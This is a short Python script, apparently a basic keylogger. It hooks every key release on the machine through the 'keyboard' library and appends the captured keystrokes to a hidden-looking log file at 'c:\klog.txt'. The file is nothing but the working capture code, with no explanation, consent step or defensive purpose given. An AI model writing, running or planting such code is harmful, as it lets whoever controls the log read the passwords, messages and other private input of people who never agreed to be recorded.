# pip install keyboard
import keyboard

text = ""


def callback(event):
    global text
    e = event.name
    text = text + e if len(e) == 1 else f"{text} {e} "
    if len(text) > 30:
        with open("c:\\klog.txt", mode="a", encoding="utf-8") as f:
            f.write(f"{text}\n")
        text = ""


keyboard.on_release(callback=callback)
